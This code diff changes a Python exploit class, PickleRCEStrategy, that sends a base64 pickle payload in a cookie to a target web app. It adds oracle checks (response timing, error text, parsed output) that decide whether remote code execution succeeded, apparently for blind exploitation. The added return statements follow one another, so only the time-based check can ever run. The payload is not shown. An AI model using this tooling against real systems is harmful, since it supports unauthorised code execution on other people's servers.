@@ -24,11 +24,13 @@ class PickleRCEStrategy(AbstractStrategy):
             cookies = {"vuln_cookie": payload_b64.decode()}
             response = requests.get(self.url, cookies=cookies, timeout=timeout)
             response.raise_for_status() # Comment this if it always returns something else than 200 or if false state returns something else than 200
-            # Here return True if the payload is executed without errors 
-            # you can base it on the status code and remove raise_for_status above
-            # or you sarch for a specific error message in the response text
-            # or you can parse the response text if you know it does return a specific output at some place
-            # you can also modify your payload to do a timebased, add timeout to request and put a return False in 
+            # Example time-based oracle. Don't forget to add sleep in your payload with the timeout value
+            return response.elapsed.total_seconds() <= timeout
+            # Exemple search for a specific error message in the response text
+            return "SPECIFIC ERROR MESSAGE" not in response.text # or return "SPECIFIC SUCCESS MESSAGE" in response.text
+            # Exemple parse specific output, eg. if the backend replies something like "Hi Mister 0! This is the output code: 0. Good luck haha!"
+            return response.text.split("This is the output code:")[0].split(".")[0] == "0" 
+            # If the backend returns a 200 status code when there is no error
             return response.status_code == 200
         except Exception:
             return None
